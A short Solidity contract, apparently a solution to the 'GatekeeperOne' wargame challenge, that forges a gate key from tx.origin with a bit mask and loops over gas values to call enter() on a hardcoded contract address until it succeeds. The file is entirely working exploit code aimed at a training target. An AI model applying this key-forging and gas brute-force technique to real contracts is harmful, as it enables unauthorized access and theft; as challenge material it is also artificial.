//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    IGateKeeperOne internal gatekeeperInterface;

    constructor() {
        gatekeeperInterface = IGateKeeperOne(
            0x3D1e133f8a31762468eeAe2CbAd2fE597323c6e0
        );
    }

    function exploit() external {
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) &
            0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 1000; i++) {
            (bool success, ) = address(gatekeeperInterface).call{
                gas: i + (8191 * 3)
            }(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}
